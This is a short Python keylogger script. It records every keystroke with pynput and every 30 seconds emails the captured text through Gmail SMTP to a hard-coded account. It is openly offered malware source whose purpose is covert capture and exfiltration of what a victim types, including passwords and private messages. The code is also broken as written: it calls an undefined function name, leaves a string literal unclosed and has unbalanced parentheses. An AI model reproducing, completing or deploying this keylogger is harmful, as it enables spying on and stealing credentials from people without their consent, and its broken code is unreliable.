import pynput.keyboard
import smtplib
import threading

list_key = ""


def callback_function(key):
    global list_key
    try:
        list_key = list_key + str(key.char)     
                                                
    except AttributeError:                      
        if key == pynput.keyboard.Key.esc:
            return False
        if key == pynput.keyboard.Key.space:
            list_key = list_key + " "
        if key == pynput.keyboard.Key.backspace:
            list_key = list_key[:-1]
        else:
            list_key = list_key + str(key)
    except:
        pass     
    print(list_key)
        
def send_email_function(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

def thread_function():
    global list_key
    send_email("testtest@gmal.com","testpassword",list_key.encode("utf-8)
    list_key = ""
    threading_start = threading.Timer(30,thread_function)
    threading_start.start()
    
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function) 

with keylogger_listener:
    thread_function()
    keylogger_listener.join() 
